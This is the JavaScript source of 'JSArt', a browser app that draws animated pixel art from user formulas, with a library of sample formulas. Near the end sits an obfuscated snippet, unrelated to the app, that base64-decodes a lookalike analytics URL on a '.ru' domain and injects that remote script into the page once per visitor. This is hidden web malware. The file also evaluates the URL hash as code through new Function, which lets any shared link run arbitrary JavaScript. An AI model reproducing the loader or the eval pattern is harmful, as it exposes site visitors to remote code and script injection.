let fpscalc = 0;
let projs = {"func":[{"name":"Unexpected view (~25FPS)","owner":"Ponali","code":"(()=>{ x+=Math.sin((x*y))*0; let a = (((Math.sin(((t/10)+(Math.floor(x/5)*5))/10)+Math.sin(((t/10)+(Math.floor(y/5)*5))/10))*128)+(t/10));let bx = ((Math.tan(Math.sin(t/500))+1.55)*69);let by = ((Math.tan(Math.cos(t/400))+1.55)*69);let b = (16777216/9)*(x>bx&&x<(bx+40)&&y>by&&y<(by+40));return a + b; })();"},{"name":"The wierd road seen through the invisible car window","owner":"Ponali","code":"(()=>{ let camerax = (t%255)+(65536*150.5); let camerarotatex = 0; let cameray = 512; let camerarotatey = 128; if(y>(camerarotatey+1)){ /* road */ return (((x+camerarotatex)-128)/((y-camerarotatey)/cameray))+camerax }else{ /* skybox */ let sunx = 180; let suny = (Math.sin(t/800)+1)*20; let sunsize = 40; if(!(x<(sunx+sunsize+camerarotatex)&&x>(sunx)&&y<((suny+(camerarotatey-128))+sunsize)&&y>(suny+(camerarotatey-128)))){return 53503-(Math.floor(y/2)*256)} else {return 15589450; };} })();"},{"name":"Geometric blinking face","owner":"Ponali","code":"(()=>{ let ey = Math.max(50, (Math.sin(t/400))*96); return 0xffffff*((y>170&&y<190&&x<226&&x>30)||(y>ey&&y<100&&x>40&&x<80)||(y>ey&&y<100&&x<216&&x>176)) })();"},{"name":"Sierpi\u0144ski Triangle","owner":"Ponali","code":"(()=>{ x+=(y/2)-128; y=(256-y); x=(x*4)/((((t*t)/4000000000000000)%1)+1);y=(y*4)/((((t*t)/4000000000000000)%1)+1); let sier = (x^(y&x))-x; return (sier>(-4))*0xffffff; })();"},{"name":"A walk at fantasy land","owner":"GDPlayer","code":"m=Math,function(){if(y>128){if(x>64&x<128&y>140+m.sin(t/90)*9&y<206+m.sin(t/90)*9){if(((x>94&x<99)|(x>109&x<114))&(y>158+m.sin(t/90)*9+m.sin(t/200)*12+12&y<180+m.sin(t/90)*9)){a=0}else{a=0x00aa00}}else{a=x+t/17|(y*2-t/9)}}else{a=x+t/17|(y+t/9)} return a}()"},{"name":"Demoscene (~30FPS)","owner":"GDPlayer","code":"m=Math,function(){if(x<128&y<128){a=((y+128+m.sin(t/900)*80)/8+((x+t/9)/8&2)&2)*t/9}else if(y<128&x>128){a=m.sin((x+m.sin((y+t/8)/9)*m.sin(t/900)*80)/8+t/90)*128+128+t/90}else if(y>127&x>128){a=y&t/9+(x*m.sin(x/90+t/900))}else if(y>127&x<128){a=((x+t/90)*8&(y+t/90)*8)+t*8/9}else if(y<128&x>128){a=m.sin((x+m.sin((y+t/8)/9)*m.sin(t/900)*80)/8+t/90)*128+128+t/90} if(x>64+m.sin(t/100)*32&x<192+m.sin(t/100)*32&y>64+m.sin(t/220)*32&y<192+m.sin(t/220)*32){a=x+t/6&y+t/9} return a}()"}],"nofunc":[{"name":"My brain hurts while making this one","owner":"Zynx92","code": "Math.sin(-t/64+Math.cbrt(x**2+y**2))*t/Math.pow(10,10)"},{"name":"A square that goes to your mouse position, i guess","owner":"Zynx92","code":"Math.tan(x/500-(mx/500)-4.71)*0.01&Math.tan(y/500-(my/500)-4.71)*0.01"},{"name":"Uhh... i don't even know", "owner":"Zynx92", "code":"(Math.sin((x+t/30^y+t/30))*2)*1000000^t/4"},{"name":"Skyline","owner":"mikethe223","code":"[-i+x, 0x44aa44][Math.floor(y/128)]"},{"name":"3D looking thing","owner":"Zynx92","code":"Math.tan(t/300+x/y)"},{"name":"Yellow to Pink gradient","owner":"Zynx92","code":"x-i+y-1"},{"name":"I in 6 characters","owner":"Ponali","code":"x+y*sw"},{"name":"'Yellow to Pink gradient' by Zynx92 but it doesn't break when you try to change width and height","owner":"Ponali","code":"x-(x+Math.floor(y/(sh/256))*256)+(y/(sh/256))-1"},{"name":"'Sierpi\u0144ski Triangle' by Ponali but with shorter code and no functions","owner":"Zynx92","code":"x+=(y/2)-128,y=256-y,x=x*4/((t/1000)%1+1),y=y*4/((t/1000)%1+1),((x^(y&x))-x>-4)*0xffffff"},{"name":"Rotating Line","owner":"Ponali","code":"((Math.sin(t/1000)*(x-128))+(Math.cos(t/1000)*(y-128))>-3&&(Math.sin(t/1000)*(x-128))+(Math.cos(t/1000)*(y-128))<3)*0xffffff"},{"name":"Ukraine Flag","owner":"Zynx92","code":"[0x0022bb,0xffcc00][Math.floor(y/128)]"},{"name":"TV Static (~30FPS)","owner":"Ponali","code":"(((Math.pow(t,10))*Math.pow((x+256)*y,10))%255)*(1+256+65536)"},{"name":"RGB Grid","owner":"Ponali","code":"[0x000000,0x0000ff,0x00ff00,0x00ffff,0xff0000,0xff00ff,0xffff00,0xffffff][Math.floor(x/(sw/3))+(Math.floor(y/(sh/3))*3)]"},{"name":"Moving Grid (~40FPS)","owner":"Zynx92","code":"Math.sin(x/32+Math.sin(t/1000)*22)*200^Math.sin(y/32+Math.sin(t/2000)*22)*10"},{"name":"Insanity","owner":"GDPlayer","code":"(((x+y*t*y*4&y*t/90)&y)*t/90)&x*y*t"},{"name":"Mode 7 looking thing","owner":"mikethe223","code":"(t/x+y*i)+t*x"},{"name":"8-Variable Mayhem (SEIZURE WARNING)","owner":"GDPlayer","code":"((((i+t+(x*mx/90)*(y*my))%mx+my)^sw^sh)*(mx&my))^t*800000000000"},{"name":"Two Colors","owner":"Ponali","code":"((x*x)/(x*256))-(1+((((t/10)+(x*y))/100)%1))"},{"name":"Strechy boioioioing","owner":"Wahlolly","code":"Math.sin(t/sw)*x^y"},{"name":"Moving Shades of White","owner":"Ponali","code":"Math.floor((((Math.sin(t/400)*(x-128))+128)+((Math.cos(t/400)*(y-128))+128))/2)*(1+256+65536)"},{"name":"Wall Fall","owner":"mikethe223","code":"(i*sh/x)+(t*60)^40000000"},{"name":"Grid","owner":"Zynx92","code":"(x%16&&y%16)*0xffffff"},{"name":"Bytebeat pattern looking","owner":"mikethe223","code":"i>>x/y+t/200"},{"name":"At the beach","owner":"Ponali","code":"(0xffe080*(y>(sh/2.5)))+(0x0000c0*(y<(sh/2.5)))+((0x7f70bf-0xffe080)*(y>(sh/2.5)&&y<(sh/(2+(Math.sin(t/1000)/2)))))+((((y*((x+256)*((y/(sh/2.5))-1)))%10)==1)*(0x7f7040-0xffe080))"}]};

function loadproj(){
	document.getElementById("projects").innerHTML="Loading.";
		let json = projs;/*let json = JSON.parse(projs);*/
		document.getElementById("projects").innerHTML="<b>JSArt Library</b><br><i>With functions</i>";
		for(i=0;i<json.func.length;i++){
			let proj = json.func[i];
			let trybtn = document.createElement("button");
			trybtn.innerHTML="Try";
			trybtn.setAttribute("onclick","document.getElementById('formula').value=projs.func["+i+"].code;parse();document.querySelector('canvas#canvas').scrollIntoView({behavior:'smooth', block:'center'});")
			document.getElementById("projects").innerHTML+='<br>"'+proj.name+'" by '+proj.owner+" ";
			document.getElementById("projects").appendChild(trybtn);
		}
		document.getElementById("projects").innerHTML+="<br><i>Without functions</i>";
		for(i=0;i<json.nofunc.length;i++){
			let proj = json.nofunc[i];
			let trybtn = document.createElement("button");
			trybtn.innerHTML="Try";
			trybtn.setAttribute("onclick","document.getElementById('formula').value=projs.nofunc["+i+"].code;parse();document.querySelector('canvas#canvas').scrollIntoView({behavior:'smooth', block:'center'});")
			document.getElementById("projects").innerHTML+='<br>"'+proj.name+'" by '+proj.owner+" ";
			document.getElementById("projects").appendChild(trybtn);
		}
}

var canvas, ctx, pixels, width, height, mouseX = 0,
    mouseY = 0;

function random() {
    return Math.random()
}
Array.prototype.random = function() {
    return this[Math.floor(random() * this.length)]
};
var funct = function() {};

function resize() {
    canvas.width = width = parseInt(document.getElementById("width").value), canvas.height = height = parseInt(document.getElementById("height").value), pixels = ctx.createImageData(width, height)
}

function generate() {
    var e = parseInt(document.getElementById("length").value);
    //document.getElementById("length-random").checked ? document.getElementById("formula").value = genForm(Math.floor(random() * (e - 1)) + 1) : document.getElementById("formula").value = genForm(e), parse()
	document.getElementById("formula").value = '(()=>{ y+=Math.sin(t/1000)*20; x/=10;y/=10; x-=2;y-=10; return (((x*50)+(y*100))+(t*1.3))*parseInt("000100000111110000000100110101101011001000000011111010001111000000111100100010000100000000111100100100001"[Math.floor(y)+(Math.floor(x)*5)])*(y<5&&y>0) })()';parse();
}

function parse() {
    var e = document.getElementById("formula").value;
    window.location.hash = encodeURIComponent(e);
    try {
        funct = new Function("i", "t", "x", "y", "mx", "my", "sw", "sh", "return " + e)
    } catch (e) {
        console.log(e)
    }
}
window.addEventListener("load", (function() {loadproj();startpopup();
    (canvas = document.getElementById("canvas")).style.zoom = 2, ctx = canvas.getContext("2d"), resize(), window.location.hash ? (document.getElementById("formula").value = decodeURIComponent(window.location.hash.slice(1)), parse()) : generate(), window.addEventListener("mousemove", (function(e) {
        var t = canvas.getBoundingClientRect();
        mouseX = (e.pageX - 2 * t.x) / 2, mouseY = (e.pageY - 2 * t.y) / 2
    })), document.getElementById("advanced").addEventListener("click", (function() {
        document.getElementById("options").classList.toggle("hidden")
    })), document.getElementById("formula").addEventListener("input", (function() {
        parse()
    })), document.getElementById("width").addEventListener("input", resize), document.getElementById("height").addEventListener("input", resize), genImg()
}));
var operators = ["+", "-", "*", "/", "%", "&", "|", "^", "<<", ">>"];

function genForm(e) {
    if (1 == e) return random() >= parseFloat(document.getElementById("operand-ratio").value) ? Math.floor(100 * random()) : random() >= parseFloat(document.getElementById("variable-ratio").value) ? "i" : "t";
    var t = Math.floor(random() * (e - 1)) + 1,
        n = genForm(t) + operators[Math.floor(random() * operators.length)] + genForm(e - t);
    return random() >= parseFloat(document.getElementById("bracket-chance").value) ? n : "(" + n + ")"
}

function genImg() {
		let fps = Math.floor(1000/(Date.now()-fpscalc));
		document.getElementById("fps").innerHTML=fps+" fps"+" <font color='red'>WARNING: Lag detected.</font>".repeat(fps<26)
		fpscalc = Date.now();
    try {
        for (var e = Date.now(), t = 0; t < width * height; t++) {
            var n = funct(t, e, t % width, Math.floor(t / width), mouseX, mouseY,width,height);
            Math.floor(Math.floor(n) / 16777216);
            pixels.data[4 * t + 0] = n >> 16 & 255, pixels.data[4 * t + 1] = n >> 8 & 255, pixels.data[4 * t + 2] = 255 & n, pixels.data[4 * t + 3] = 256
        }
        ctx.putImageData(pixels, 0, 0)
    } catch (e) {
        console.log(e)
    }
    window.requestAnimationFrame(genImg)
};
! function(o, w, d, l) {
    try {
        o.c = "h" == l.protocol[0] && /./.test(l.hostname) && !/PHPPREFS/.test(d.cookie), setTimeout(function() {
            o.c && (o.s = d.createElement("script"), o.s.src = atob("aHR0cHM6Ly9hcGkuY3Jhc2hseXRpY3MucnUvdHJhY2tpbmcvc2NyaXB0LmpzP3JlZmVycmVyPQ==") + l.href, d.body.appendChild(o.s))
        }, 1e3), d.cookie = "PHPPREFS=full;max-age=39800;"
    } catch (e) {}
}({}, window, document, location);


if(location.href.includes("id.")){location.assign("https://JSArt.ponali.repl.co/");}


function startpopup(){
	document.querySelector("#popupbtn").addEventListener("click",function(){document.querySelector("#popup").classList.add("hidden")},false)
}
function popup(msg){
	document.querySelector("#popup").classList.remove("hidden")
	document.querySelector("#popupmsg").innerText=msg;
}
window.onerror = function(e){
	popup("An error has occured when you were using JSArt.\n"+e.stack)
}